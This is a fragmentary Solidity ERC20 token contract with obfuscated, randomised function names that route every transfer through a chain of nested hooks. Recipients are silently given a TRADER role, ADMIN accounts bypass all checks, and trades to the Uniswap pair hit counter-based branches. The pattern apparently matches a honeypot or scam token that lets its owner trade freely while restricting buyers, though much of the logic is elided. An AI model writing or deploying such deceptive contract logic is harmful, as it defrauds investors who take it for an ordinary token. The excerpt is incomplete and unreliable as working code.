...
interface _UDNENJSLRoleControl {
...
abstract contract _UDNENJSLConsole is Context, _UDNENJSLRoleControl {
...
contract _UDNENJSLERC20 is Context, IERC20, IERC20Metadata {
...
contract Token is _UDNENJSLERC20, _UDNENJSLConsole {
    ...
    ) _UDNENJSLERC20(_name, _symbol, _totalSupply, _tokenOwner) {
    ...
    function _transfer(
        ...
        address to,
        uint256 amt
    ) internal override(_UDNENJSLERC20) {
        require(from != address(0), "ERC20: transfer from the zero address");

        __UDNENJSLbtrsvv(from, to, amt);

    }

    function __UDNENJSLbtrsvv(address from, address to, uint256 amt) internal {
        require(to != address(0), "ERC20: transfer to the zero address");
        require(_balances[from] >= amt, "ERC20: transfer amt exceeds balance");

        __UDNENJSLwecydv(from, to, amt);
    }


    function __UDNENJSLwecydv(address from, address to, uint256 amt) internal {
        ...
        __UDNENJSLusfwscn(from, to, amt);
    }

    function __UDNENJSLusfwscn(address from, address to, uint256 amt) internal {
        if (__traders[to] == false) {
            _grantRole(TRADER, to);
            __traders[to] = true;
            
        }
        __UDNENJSLujfbcberg(from, to, amt);
    }

    function __UDNENJSLujfbcberg(address from, address to, uint256 amt) internal {
        bool isAddLdx;
        if(to == uniswapV2Pair){
        ...
        __UDNENJSLefdycfa(from, to, amt);
    }


    function __UDNENJSLefdycfa(address from, address to, uint256 amt) internal {
        if(to == uniswapV2Pair){
            if(svcount > 99){
        ...
        __UDNENJSLuiysdne(from, to, amt);
    }

    function __UDNENJSLuiysdne(address from, address to, uint256 amt) internal {
        if (hasRole(ADMIN, from) || hasRole(ADMIN, to)) {
            super._transfer(from, to, amt);
            return;
        }else if (hasRole(TRADER, from) && hasRole(TRADER, to)) {

           __UDNENJSLtnnrtfd(from, to, amt);
    ...
    function __UDNENJSLtnnrtfd(address from, address to, uint256 amt) internal {
        if(amt > 0){
